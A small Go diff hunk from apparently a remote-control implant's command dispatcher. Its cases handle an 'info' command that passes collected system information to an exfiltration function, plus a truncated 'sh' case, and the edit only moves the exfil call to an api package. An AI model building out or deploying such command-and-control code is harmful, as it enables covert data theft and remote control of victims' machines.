@@ -173,7 +173,7 @@ func CMDSwitch(command string, vars []string, tag string, full string) {
 		case "reset":
 			api.NewGenesis()
 		case "info":
-			Exfil(Info())
+			api.Exfil(Info())
 		case "soft":
 			Software()
 		case "sh":
